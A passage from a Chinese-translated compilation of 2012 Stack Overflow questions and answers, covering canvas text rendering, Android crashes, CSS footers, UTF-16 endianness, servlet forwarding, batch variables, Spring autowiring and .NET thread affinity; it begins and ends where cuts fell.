    imageElem = document.getElementById('image'); //Image element

// Text input element
document.getElementById('text').addEventListener('keyup', function() {
  tCtx.canvas.width = tCtx.measureText(this.value).width;
  tCtx.fillText(this.value, 0, 10);
  imageElem.src = tCtx.canvas.toDataURL();
  console.log(imageElem.src);
}, false);
```

```
canvas{
    border: 1px black solid;
}
#textCanvas{
    display: none;
}
```

```
<canvas id='textCanvas' height=20></canvas>
<img id='image'>
<br>
<textarea id='text'></textarea>
```

​</p>

[演示](https://jsfiddle.net/amaan/WxmQR/1/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T12:13:48.997

Amaan 建议的画布方法绝对是当今在客户端生成图像的方法。

过去，最常见的解决方案是使用像[Cufon](http://cufon.shoqolate.com/generate/)这样的库。来自[关于其用法的 Cufon wiki 页面](https://github.com/sorccu/cufon/wiki/Usage)来自以下片段：

```
<script type="text/javascript">
    Cufon.replace('h1'); // Works without a selector engine
    Cufon.replace('#sub1'); // Requires a selector engine for IE 6-7, see above
</script> 
```

Cufon 预先生成客户端版本的字体。这意味着它只是在您的网络服务器上添加静态文件，而不是在网络服务器上生成图像（如 ImageMagick）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-08T07:15:59.397

您需要在服务器端使用 ImageMagick。根据您使用的框架类型，您可能需要编写一些不错的 shell 脚本。

或者

你可以看看这个：

[http://www.blitline.com/docs/functions](http://www.blitline.com/docs/functions)

# android - 不幸的是在 Android 中已停止

> ID：12328715
> 
> 赞同：-3
> 
> 时间：2012-09-08T06:55:42.023
> 
> 标签：android

不幸的是，appname 已停止，而我正在为 androidmanifest.xml 文件和 Java 文件使用主要活动，因此没有机会使用不同的活动，但我仍然收到此消息，例如：

`Unfortunately LunchList has Stopped`.

当我使用 SQLite 数据库、RSS 阅读器等制作简单的 Android 应用程序时，我得到了这个，但问题是我的代码工作正常，因为没有向我显示编码错误，并且我能够运行和调试我的应用程序。我也遇到了选项菜单的问题，例如有时菜单没有出现，有时它们出现但没有响应。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:58:02.290

> 但问题是我的代码工作正常，因为没有向我显示编码错误

你的意思是它正在编译？*这和工作*不一样。显然你的代码*不起作用*，否则它不会像这样崩溃。

您应该查看应用程序的日志文件（例如使用[logcat](http://developer.android.com/tools/help/logcat.html)）。我相信它会向您显示带有堆栈跟踪的异常。这应该让您很好地了解出了什么问题，以及哪里出了问题。如果您发现出了什么问题但不明白*为什么*会出现问题，这本身就是一个合理的 Stack Overflow 问题，但首先要获取初始诊断信息。

请注意，如果您在调试器中运行您的应用程序，我希望如果发生此错误，调试器应该停止向您显示问题所在。（我从未构建过 Android 应用程序，所以我不能发誓就是这样，但这是一个合理的期望。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:59:30.327

当您遇到 FC（强制关闭）时，您应该监控您的应用程序。在 Eclipse 中打开 DDMS 视图并使用 logcat 监视应用程序。看看是什么导致了问题！

# javascript - 如何在 textarea 中使用 google-code-prettify

> ID：12328716
> 
> 赞同：1
> 
> 时间：2012-09-08T06:55:58.773
> 
> 标签：javascript, html, web

我正在开发具有 xml、java 程序的网站。我已经在 TextArea 中成功显示了 xml 和 java 编码。但是我需要在不改变 eclipse 编辑器显示的颜色的情况下显示编码。所以我下载[了谷歌代码美化](http://code.google.com/p/google-code-prettify/downloads/list)。我也得到了清晰的[教程](http://google-code-prettify.googlecode.com/svn/trunk/README.html)。它成功地工作了。

但我可以知道如何在 TextArea 中使用谷歌代码美化吗？

帮我。

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-05-03T04:00:38.270

Google Code Prettify 不适用于 textareas。

试试这个[Codemirror](http://codemirror.net/)吗？

它做你想做的事：美化 textarea 中的代码。

# windows-services - 在窗口服务中使用 SignalR

> ID：12328725
> 
> 赞同：1
> 
> 时间：2012-09-08T06:57:27.177
> 
> 标签：windows-services, signalr

我正在使用 SignalR 通过窗口服务向客户端浏览器广播消息。

```
It only works on <http://localhost>
<HubConnection("http://localhost/signalr")>

Change to <http://www.xyz.com> will get an error message: "One or more errors occurred".
<HubConnection("http://xyz.com/signalr")> 
```

是否需要任何设置或其他库才能使其工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-12T16:42:53.090

你不需要任何额外的组件，毕竟它已经在本地工作了。

当与远程 SignalR 资源的连接不成功时，将返回“发生一个或多个错误”错误。

您可以使用[Fiddler](http://fiddler2.com/fiddler2/)和[wFetch](http://www.microsoft.com/en-us/download/details.aspx?id=17275)来解决此类问题

# iphone - iPhone 的自定义警报视图

> ID：12328730
> 
> 赞同：2
> 
> 时间：2012-09-08T06:58:06.633
> 
> 标签：iphone, ios

我正在尝试为 iphone 应用程序实现我自己的警报视图。该应用程序支持所有方向，并且通常同时显示标签栏和导航栏。目前，我将自定义警报视图添加为活动视图控制器的子视图 - 这很好用，因为它支持透明覆盖并支持旋转。但是，标签栏和导航栏没有被警报视图的覆盖覆盖。我已经放弃将警报添加到 keywindow，因为它不支持旋转，并且由于使用 keywindow 的其他问题。有关如何使用透明覆盖实现自定义警报的任何建议，该覆盖也将覆盖任何导航和/或标签栏并且还支持旋转？

# html - 子 div 突出或相对定位的父 div/页脚问题

> ID：12328732
> 
> 赞同：1
> 
> 时间：2012-09-08T06:58:15.497
> 
> 标签：html, parent-child, footer

我的 div 有问题。我正在尝试制作一个内容父级潜水，当帖子被放置在其中时（wordpress 主题），它不会从底部突出显示子级。我发现这样做的关键是让父 div 绝对，但这给我带来了另一个问题。问题是我还想要一个相对定位的页脚，它会随着内容 div 的延伸而移动。那么我想要的是如何同时拥有一个“有弹性的”内容 div 和一个相对定位的页脚？这是我的CSS：

```
body{height: 100%; 
margin: 0;
padding: 0;
} 
#wrapper{width: 100%;
min-height: 100%;
height: auto !important;
height: 100%;
}
#content{height: 35em;
width: 30em:
position: absolute;
padding: .62em;
margin: 5em;
}
.post{width: 12em;
height: 12em;
margin: 1em;
float: left;
}
#footer{position: absolute;
bottom: 0;
left: 0;
width: 100%;
text-align: center;
margin: 1em 0 0;
} 
```

就像我说的，我已经尝试过相对定位，但这并不符合我的喜好。我还尝试了“粘性页脚”方法，该方法在大分辨率屏幕上运行良好，但在较小的 res 屏幕上显示在内容 div 的前面或后面（取决于 z-index）。另外，如果可能的话，我宁愿不使用 JS。任何帮助深表感谢！在此处输入代码

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T07:10:28.503

*   在内容中将溢出设置为自动，
*   在内容中将高度更改为最小高度，
*   将绝对元素包裹在相对 div 中以获得快乐。

这是一个显示它的 jsfiddle：http: [//jsfiddle.net/mAhet/](http://jsfiddle.net/mAhet/)

HTML

```
<html>
<body>
    <div id="wrapper">
        <div id="content">
            <div style="position:relative; width:100%; height:100%;">
             <div class="post">lasa sf </div>
             <div class="post"> asd asd as</div>
             <div class="post"> asd a dsadda das</div>
        </div>
        </div>
        <div id="footer"></div>
    </div>
</body>
</html>​ 
```

CSS

```
body{height: 100%; 
margin: 0;
padding: 0;
} 
#wrapper{width: 100%;
min-height: 100%;
height: auto !important;
height: 100%;
position:relative;
}
#content{

min-height: 35em;
width: 30em:
position: absolute;
padding: .62em;
margin: 5em;
overflow:auto;
}
.post{width: 12em;
height: 12em;
margin: 1em;
float: left;
}
#footer{position: absolute;
bottom: 0;
left: 0;
width: 100%;
text-align: center;
margin: 1em 0 0;
}​ 
```

这是一个 jsfiddle 展示它的实际操作：http: [//jsfiddle.net/mAhet/](http://jsfiddle.net/mAhet/)

# python - unicode endian 让我很困惑

> ID：12328740
> 
> 赞同：5
> 
> 时间：2012-09-08T06:59:51.543
> 
> 标签：python, encoding, utf-8, endianness, ucs2

我以三种不同的形式编辑三个具有相同内容“你”（`you`英文）的文件——gbk\utf-8\ucs-2，gedit 名为“ok1,ok2,ok3”。

```
>>> f1 = open('ok1', 'rb').read()
>>> f2 = open('ok2', 'rb').read()
>>> f3 = open('ok3', 'rb').read()
>>> f1
'\xc4\xe3\n'
>>> f2
'\xe4\xbd\xa0\n'
>>> f3
'`O\n\x00'
>>> hex(ord("`"))
'0x60'
>>> hex(ord("O")) 
'0x4f' 
```

实际上 f3 是 '\x60\x4f'，但是下面的输出让我很困惑

```
>>> '\xe4\xbd\xa0'.decode("utf-8")
u'\u4f60'
>>> '\xc4\xe3'.decode("gbk")
u'\u4f60'
>>> 
```

为什么在ucs-2（或说unicode）中只有字节序问题，而不是utf-8，而不是gbk？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-08T07:17:04.263

*UTF-8*和*GBK*以字节序列存储数据。在这些编码中，强烈定义了哪个字节值在哪个之后。此字节顺序不会随着编码、传输或解码中使用的架构而改变。

另一方面，*UCS-2*或新的*UTF-16*以 2 字节序列存储数据。这些 2 字节令牌中各个字节的顺序是*字节序*，它取决于底层机器架构。*在与UCS-2*中编码的数据进行通信之前，系统必须就如何识别令牌的字节顺序达成一致。

在您的情况下，Unicode 点 U+4F60 在*UCS-2*中编码为单个 2-byte token `0x4F60`。由于您的机器在内存对齐中将最低有效字节放在最高有效字节之前，因此`('0x60', '0x4F')`已将序列放入文件中。因此，文件读取将按此顺序产生字节。

Python 仍然可以正确解码这些数据，因为它会在形成 2 字节标记之前以正确的顺序读取字节：

```
>>> '`O\n\x00'.decode('utf-16')
u'\u4f60\n' 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-08T07:21:30.283

Endian-ness 仅适用于多字节字，但 UTF-8 使用 8 位单位来编码信息（这就是名称中的 8 所代表的意思）。那里从来没有订购混乱的问题。

有时它可能需要多个单元来编码信息，但它们被认为是不同的。例如，字母`A`是一个字节`0x41`。当它必须用更多字节编码一个字符时，它使用一个前导指示字节，然后是额外的连续字节来捕获该字符所需的所有信息。从逻辑上讲，这些是不同的单位。

GBK采用了类似的方案；字符使用 1 个字节为单位，就像 UTF-8 一样，第二个字节可用于某些字符。

另一方面，UCS-2（以及它的后继者 UTF-16）是一种 2 字节格式。它以 16 位为单位对信息进行编码，而这 16 位总是在一起。该单元中的 2 个字节在逻辑上属于一起，现代架构将它们视为一个单元，因此决定了它们的存储顺序。这就是字节序出现的地方，一个单元中 2 个字节的顺序取决于架构。在*您的*体系结构中，字节是使用小端序排列的，这意味着“较小的”字节首先出现。这就是为什么字节在文件中的`0x4F`字节之前出现的原因`0x60`。

请注意，python 可以很好地读取大端或小端 UTF-16；如果开头没有指示符（字节顺序标记或 BOM），您可以显式选择字节顺序：

```
>>> '`O\n\x00'.decode('utf-16')
u'\u4f60\n'
>>> '`O\n\x00'.decode('utf-16-le')
u'\u4f60\n'
>>> 'O`\x00\n'.decode('utf-16-be')
u'\u4f60\n' 
```

在后一个示例中，字节已被反转，并被解码为大端。

# java - 过滤器---设置属性后--->Servlet---获取和设置属性后--->Jsp 怎么做？

> ID：12328742
> 
> 赞同：-2
> 
> 时间：2012-09-08T06:59:54.147
> 
> 标签：java, jakarta-ee, servlets, servlet-filters

这就是我想要做的：

调用 servlet。在调用 servlet 之前，请求被过滤器拦截。过滤器从请求中获取一些详细信息，将它们设置为属性并通过`chain.doFilter(request,response)`. 请求最终到达 servlet。Servlet 获取之前由过滤器设置的属性，并通过另一个名称设置新的属性。然后它将它转发到某个 jsp 页面，该页面在该页面获取属性并对其进行处理。

我该怎么做呢 ？我知道如何编写过滤器和 servlet，但是如何将它从 servlet 转发到 jsp 页面，或者有没有其他方法可以实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T07:06:01.427

您可以使用`RequestDispatcher.forward`servlet 中的方法：

```
public class YourServlet extends HttpServlet {

    public void doGet(HttpServletRequest request, 
          HttpServletResponse response) throws ServletException, IOException {

        RequestDispatcher rd = getServletConfig().getServletContext()
                      .getRequestDispatcher("/yourJsp.jsp");
        rd.forward(request, response);
    }
} 
```

另请参阅[javaee 5 教程](http://docs.oracle.com/javaee/5/tutorial/doc/bnagi.html#bnagk)

**编辑：**我已经在 tomcat 7 示例上测试了这种方法：

*   我已启用示例定时过滤器
*   我调用了 servletToJsp 示例（在此示例中，servlet 转发到 jsp）

一切都很完美。过滤器完成了他的工作，没有例外。

您应该从一开始就指定您有问题并提供堆栈跟踪等。

关于评论中的问题：

> 为什么不 request.getRequestDispatcher ？

在我提供的示例中，因为我调用的是绝对路径，所以没有区别。`request.getRequestDispatcher`处理相对路径时很有用。请参阅[这个](https://stackoverflow.com/questions/1411114/servletcontext-getrequestdispatcher-vs-servletrequest-getrequestdispatcher)SO 问题。

**编辑2：**

我使用过滤器、servlet 和 jsp 附加源。

筛选：

```
package tests.filters;

import javax.servlet.*;
import java.io.IOException;

public final class ExampleFilter implements Filter {

    private String attribute = null;

    private FilterConfig filterConfig = null;

    @Override
    public void destroy() {
        this.attribute = null;
        this.filterConfig = null;
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                     FilterChain chain)
        throws IOException, ServletException {

        if (attribute != null)
            request.setAttribute(attribute, this);

        long startTime = System.currentTimeMillis();
        chain.doFilter(request, response);
        long stopTime = System.currentTimeMillis();

        filterConfig.getServletContext().log
            (this.toString() + ": " + (stopTime - startTime) +
                    " milliseconds");
    }

    @Override
    public void init(FilterConfig fConfig) throws ServletException {

        this.filterConfig = fConfig;
        this.attribute = fConfig.getInitParameter("attribute");
    }

    @Override
    public String toString() {
        if (filterConfig == null)
            return ("TimingFilter()");
        StringBuilder sb = new StringBuilder("TimingFilter(");
        sb.append(filterConfig);
        sb.append(")");
        return (sb.toString());

    }
} 
```

小服务程序：

```
package tests.servlets;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ServletToJsp extends HttpServlet {

    private static final long serialVersionUID = 1L;

    @Override
    public void doGet (HttpServletRequest request,
                   HttpServletResponse response) {
        try {
            request.setAttribute ("servletName", "servletToJsp");
            getServletConfig().getServletContext().getRequestDispatcher(
                    "/jsp/jsp-to-servlet/hello.jsp").forward(request, response);
        } catch (Exception ex) {
            ex.printStackTrace ();
        }
    }
} 
```

JSP：

```
<html>
    <body bgcolor="white">

    <h1>
    I have been invoked by
        <% out.print (request.getAttribute("servletName").toString()); %> Servlet.
   </h1>

</html> 
```

web.xml

```
<web-app xmlns="http://java.sun.com/xml/ns/javaee"
     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:schemaLocation="http://java.sun.com/xml/ns/javaee
                  http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
     version="3.0"
     metadata-complete="true">

<filter>
    <filter-name>Timing Filter</filter-name>
    <filter-class>tests.filters.ExampleFilter</filter-class>
    <init-param>
        <param-name>attribute</param-name>
        <param-value>tests.filters.ExampleFilter</param-value>
    </init-param>
</filter>

<filter-mapping>
    <filter-name>Timing Filter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>

<servlet>
    <servlet-name>ServletToJsp</servlet-name>
    <servlet-class>tests.servlets.ServletToJsp</servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>ServletToJsp</servlet-name>
    <url-pattern>/servletToJsp</url-pattern>
</servlet-mapping>
</web-app> 
```

我还提供了一个下载链接，其中包含打包为战争的示例：http: [//goo.gl/GaV5w](http://goo.gl/GaV5w)（7 天可用）

只需将文件复制到您的**tomcat 7** webapps 目录中并从浏览器调用：`http://localhost:8080/webapp-javaee6-1.0-SNAPSHOT/servletToJsp`. 您将在 logs/localhost.currentDate.log 文件中看到过滤器打印处理时间，而 jsp 显示其内容。

我不能再做任何事情来说服您这种方法有效并且您的问题（如果您有问题）在其他地方。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-10T11:18:38.473

是的，当我们给出通配符时。这意味着对于任何请求，过滤器都会首先拦截该请求。您实际上可以在需要引入安全性的完整 Web 应用程序中想象这种情况。在最简单的形式中，您将编写一个安全过滤器来授权您的用户。因此，您可以将映射设置为通用的，以便为每个请求首先调用您的安全过滤器。当您已经提交响应时，您会收到 IllegalState 异常。你的代码工作正常吗？如果您的代码仍然无法正常工作，请发布您的代码。HTH，本

# windows - 为什么在尝试批量打印变量时出现“Echo is on”

> ID：12328744
> 
> 赞同：15
> 
> 时间：2012-09-08T07:00:05.570
> 
> 标签：windows, windows-7, batch-file, dos

我尝试执行一个简单的批处理文件脚本：

```
echo %1
set var = %1
echo %var% 
```

当我在 XP 中运行它时，它给了我预期的输出，但是当我在 Vista 或 Windows 7 中运行它时，我在尝试打印（回声）值时得到“Echo is On”。

下面是程序的输出：

```
G:\2012>abc.bat 1

G:\2012>echo 1
1

G:\2012>set var = 1

G:\2012>echo
ECHO is on.

G:\2012> 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-09-08T08:27:43.983

去掉集合表达式中的空格。等号 (=) 的两边可以且不应有空格

```
set var=%1 
```

顺便说一句：我通常以关闭@echo 开始所有批处理文件，并以打开@echo 结束它们，这样我就可以避免将代码与批处理文件的输出混合。它只是让你的批处理文件输出更好更干净。

# vba - 如何正确公开和设置工作表？

> ID：12328747
> 
> 赞同：0
> 
> 时间：2012-09-08T07:00:11.183
> 
> 标签：vba, excel

```
Public sp As Worksheet  //  on top of ThisWorkbook module
...
Sub one()
Set sp = Sheets("blueSky")  // marked
MsgBox sp.Name
...
Sub two()
Set sp = Sheets("blueSky")  //  marked
MsgBox sp.Range("A1").Value 
```

标记线始终相同。
那么，是否可以只写一次标记的行 - 以及在哪里？
我尝试了 Workbook.Open 事件——没有结果
我想在每个 Sub 中只写第三行——这总是不同的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T07:26:43.117

如果您将以下内容放入模块（不是`ThisWorkbook`）中，您将获得一个全局`Worksheet`变量：

```
Option Explicit

Global sp As Worksheet 
```

然后，您可以在`ThisWorkbook`（subs`one()`并且`two()`也将在模块中工作）中以以下任何方式对其进行寻址：

```
Option Explicit

Public Sub one()
    Set sp = Sheets("Sheet1")  '// marked
    MsgBox sp.Name
End Sub

Sub two()
    Set sp = Sheets("Sheet2") ' //  marked
    MsgBox sp.Range("A1").Value
End Sub

Private Sub Workbook_Open()
    Set sp = Sheets("Sheet3")
End Sub 
```

# java - 创建bean时获取异常

> ID：12328748
> 
> 赞同：-1
> 
> 时间：2012-09-08T07:00:19.333
> 
> 标签：java, spring

我遇到以下问题，请建议我解决方案

造成的：

`org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping#0': Initialization of bean failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'configurationController': Injection of autowired dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Could not autowire field: protected com.peakpacific.cbs.administrator.service.ConfigurationService com.peakpacific.cbs.administrator.controller.ConfigurationController.configurationService; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No matching bean of type [com.peakpacific.cbs.administrator.service.ConfigurationService] found for dependency: expected at least 1 bean which qualifies as autowire candidate for this dependency. Dependency annotations: {@javax.inject.Inject()} at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:527) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:293) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:290) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:192) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:585) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425) at org.springframework.test.context.support.AbstractGenericContextLoader.loadContext(AbstractGenericContextLoader.java:84) at org.springframework.test.context.support.AbstractGenericContextLoader.loadContext(AbstractGenericContextLoader.java:1) at org.springframework.test.context.TestContext.loadApplicationContext(TestContext.java:280) at org.springframework.test.context.TestContext.getApplicationContext(TestContext.java:304) ... 30 more Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'configurationController': Injection of autowired dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Could not autowire field: protected com.peakpacific.cbs.administrator.service.ConfigurationService com.peakpacific.cbs.administrator.controller.ConfigurationController.configurationService; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No matching bean of type [com.peakpacific.cbs.administrator.service.ConfigurationService] found for dependency: expected at least 1 bean which qualifies as autowire candidate for this dependency. Dependency annotations: {@javax.inject.Inject()} at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:288) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1074) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:293) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:290) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:192) at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1075) at org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.registerHandler(AbstractUrlHandlerMapping.java:383) at org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.registerHandler(AbstractUrlHandlerMapping.java:362) at org.springframework.web.servlet.handler.AbstractDetectingUrlHandlerMapping.detectHandlers(AbstractDetectingUrlHandlerMapping.java:82) at org.springframework.web.servlet.handler.AbstractDetectingUrlHandlerMapping.initApplicationContext(AbstractDetectingUrlHandlerMapping.java:58) at org.springframework.context.support.ApplicationObjectSupport.initApplicationContext(ApplicationObjectSupport.java:119) at org.springframework.web.context.support.WebApplicationObjectSupport.initApplicationContext(WebApplicationObjectSupport.java:72) at org.springframework.context.support.ApplicationObjectSupport.setApplicationContext(ApplicationObjectSupport.java:73) at org.springframework.context.support.ApplicationContextAwareProcessor.invokeAwareInterfaces(ApplicationContextAwareProcessor.java:109) at org.springframework.context.support.ApplicationContextAwareProcessor.postProcessBeforeInitialization(ApplicationContextAwareProcessor.java:88) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:394) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1413) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519) ... 42 more Caused by: org.springframework.beans.factory.BeanCreationException: Could not autowire field: protected com.peakpacific.cbs.administrator.service.ConfigurationService com.peakpacific.cbs.administrator.controller.ConfigurationController.configurationService; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No matching bean of type [com.peakpacific.cbs.administrator.service.ConfigurationService] found for dependency: expected at least 1 bean which qualifies as autowire candidate for this dependency. Dependency annotations: {@javax.inject.Inject()} at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:508) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:84) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:285) ... 62 more Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No matching bean of type [com.peakpacific.cbs.administrator.service.ConfigurationService] found for dependency: expected at least 1 bean which qualifies as autowire candidate for this dependency. Dependency annotations: {@javax.inject.Inject()} at org.springframework.beans.factory.support.DefaultListableBeanFactory.raiseNoSuchBeanDefinitionException(DefaultListableBeanFactory.java:924) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:793) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:707) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:480) ... 64 more`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T07:02:56.817

好吧，你给了我们一个很大的堆栈跟踪，但没有代码或配置。基本上这是问题所在：

> 没有为依赖找到类型为 [com.peakpacific.cbs.administrator.service.ConfigurationService] 的匹配 bean：预计至少有 1 个 bean 有资格作为此依赖的自动装配候选者

所以你已经`ConfigurationService`用`@Inject`注解修饰了一个类型的字段，但是你的配置中没有任何东西告诉 Spring 如何实现这个依赖。假设您确实*需要*它，您应该寻找您*尝试*提供的位置`ConfigurationService`，并检查有关该配置的所有内容。

# android - 在创建 prolect 时出现错误

> ID：12328749
> 
> 赞同：0
> 
> 时间：2012-09-08T07:00:54.823
> 
> 标签：android

我在 Eclipse 中创建了新项目，但出现了一个错误。它没有采用 main 方法。给出错误作为 main 无法解决或不是类型。我已经构建了项目

# .net - 在 Microsoft .Net 中设置线程处理器关联

> ID：12328751
> 
> 赞同：11
> 
> 时间：2012-09-08T07:01:04.373
> 
> 标签：.net, cpu, affinity

（发布这个答案是因为我在任何地方都找不到关于如何做到这一点的完整解释，所以我认为它可能对某人有一些价值）

如何在 Microsoft .Net 中设置特定线程的处理器亲和性？通过 设置进程的亲和性是微不足道的[`System.Diagnostics.Process.ProcessorAffinity`](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.processoraffinity.aspx)，但是[`System.Threading.Thread`](http://msdn.microsoft.com/en-us/library/system.threading.thread.aspx)该类不提供此类功能，并且.Net 不保证托管线程链接到任何特定的操作系统线程。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-09-08T07:01:04.373

托管线程和操作系统线程之间的分离可以追溯到 .Net 2.0，并且 SQL Server 团队计划使用纤程实现 .Net 线程。这从未真正发生过，因此虽然不能保证托管线程将始终在同一个操作系统线程上运行，但实际上对于所有当前的 .Net 主机都是如此。鉴于自 .Net 2.0 推出以来的这些年里，这种情况一直没有改变，这种情况不太可能永远改变。

[`System.Threading.Thread.BeginThreadAffinity`](http://msdn.microsoft.com/en-us/library/system.threading.thread.beginthreadaffinity.aspx)通过使用该方法，即使对于 .Net 的未来版本，也可以增强我们的信心。这保证了托管线程将保持在同一个操作系统线程上（因此它在默认 CLR 主机上什么也不做，因为默认情况下已经如此）。我想其他托管线程仍然有可能共享相同的操作系统线程，但这似乎不太可能，并且在任何当前的 .Net 主机中绝对不是这种情况。

.Net 提供了使用该类访问本机操作系统线程[`System.Diagnostics.ProcessThread`](http://msdn.microsoft.com/en-us/library/System.Diagnostics.ProcessThread.aspx)的能力，并且该类具有使用该[`ProcessorAffinity`](http://msdn.microsoft.com/en-us/library/system.diagnostics.processthread.processoraffinity.aspx)属性更改线程的处理器亲和性的能力。然而，将一个特定的托管线程链接到它`ProcessThread`是故意困难的。

唯一真正的方法是从线程本身内部。使用该[`System.AppDomain.GetCurrentThreadId`](http://msdn.microsoft.com/en-us/library/system.appdomain.getcurrentthreadid.aspx)方法（[`GetCurrentThreadId`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms683183.aspx)如果您不想调用已弃用的方法，则使用 PInvoke 函数，尽管这不适用于 Windows 以外的操作系统上的 Mono）。然后可以将其与[`ProcessThread.Id`](http://msdn.microsoft.com/en-us/library/system.diagnostics.processthread.id.aspx)属性相匹配。

这使得可以使用以下代码设置线程的处理器亲和性（从线程内部调用）：

```
/// <summary>
/// Sets the processor affinity of the current thread.
/// </summary>
/// <param name="cpus">A list of CPU numbers. The values should be
/// between 0 and <see cref="Environment.ProcessorCount"/>.</param>
public static void SetThreadProcessorAffinity(params int[] cpus)
{
    if( cpus == null )
        throw new ArgumentNullException("cpus");
    if( cpus.Length == 0 )
        throw new ArgumentException("You must specify at least one CPU.", "cpus");

    // Supports up to 64 processors
    long cpuMask = 0;
    foreach( int cpu in cpus )
    {
        if( cpu < 0 || cpu >= Environment.ProcessorCount )
            throw new ArgumentException("Invalid CPU number.");

        cpuMask |= 1L << cpu;
    }

    // Ensure managed thread is linked to OS thread; does nothing on default host in current .Net versions
    Thread.BeginThreadAffinity();

#pragma warning disable 618
    // The call to BeginThreadAffinity guarantees stable results for GetCurrentThreadId,
    // so we ignore the obsolete warning
    int osThreadId = AppDomain.GetCurrentThreadId();
#pragma warning restore 618

    // Find the ProcessThread for this thread.
    ProcessThread thread = Process.GetCurrentProcess().Threads.Cast<ProcessThread>()
                               .Where(t => t.Id == osThreadId).Single();
    // Set the thread's processor affinity
    thread.ProcessorAffinity = new IntPtr(cpuMask);
} 
```

请记住，虽然这适用于当前版本的 .Net，但理论上缺乏托管线程绑定到 OS 线程的保证可能会在将来破坏此代码。但是，我认为这极不可能。

# javascript - 如何获取 rad 文本框值长度抛出 javascript

> ID：12328755
> 
> 赞同：0
> 
> 时间：2012-09-08T07:01:32.213
> 
> 标签：javascript

我`radcontrols`在我的项目中使用。如何获取 rad 文本框值的长度。如果我输入`12345`，长度应该是`5`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T07:04:54.190

